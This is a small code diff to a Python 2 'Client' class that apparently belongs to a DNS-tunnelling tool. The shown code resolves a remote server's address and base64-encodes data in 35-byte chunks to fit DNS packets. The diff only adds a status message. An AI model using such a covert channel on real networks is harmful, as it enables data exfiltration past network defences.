@@ -32,6 +32,8 @@ class Client:
             print "[*] Resolving IP of domain..."
             final_destination = socket.gethostbyname(self.remote_server)
 
+        print "[*] Splitting data into chunks that fit in DNS packets...."
+
         while (byte_reader < len(data_to_transmit) + 35):
             encoded_data = base64.b64encode(data_to_transmit[byte_reader:byte_reader + 35])
 
